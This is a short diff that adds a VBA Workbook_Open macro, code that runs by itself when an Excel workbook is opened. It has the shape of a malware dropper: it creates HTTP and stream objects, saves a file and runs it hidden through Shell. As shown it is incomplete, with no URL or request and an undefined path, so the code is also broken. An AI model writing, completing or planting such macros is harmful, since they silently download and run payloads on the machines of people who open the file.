@@ -1,0 +1,7 @@
+Sub Workbook_Open()
+Set x = CreateObject("MSXML2.XMLHTTP")
+Set s = CreateObject("ADODB.Stream")
+s.SaveToFile p, 2
+Shell p, 0
+End Sub
+
